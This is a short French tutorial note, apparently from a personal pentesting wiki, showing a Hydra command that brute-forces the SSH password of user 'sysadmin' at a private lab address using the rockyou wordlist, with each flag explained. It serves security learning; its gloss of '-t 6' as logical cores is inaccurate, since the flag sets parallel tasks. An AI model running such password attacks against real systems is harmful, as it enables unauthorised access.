---
{"dg-publish":true,"permalink":"/kali/brute-force-hydra/"}
---

Pour commencer il faut se retrouver sur notre machine kali linux ou tout autres machine contenant le paquet hydra (pour moi ce sera une kali):

```Shell
┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
└─$ sudo -s
┌──(root㉿DESKTOPEnzo)-[root]
└─$ hydra -l sysadmin -P /home/kali/rockyou.txt -t 6 ssh://10.54.0.100:22
```
- `<-l sysadmin>`  déclare le username que l'on veut avoir ici c'est donc `<sysadmin>`
- `<-P /home/kali/rockyou.txt>` déclare le chemin du fichier de notre banque de mot de passe
- `<-t 6>` précise le nombre de coeur logique actif pour cette tâche 
- `<ssh://10.54.0.100:22>` sert à déclarer le protocole donc `<ssh>` ici ainsi que l'IP et le port.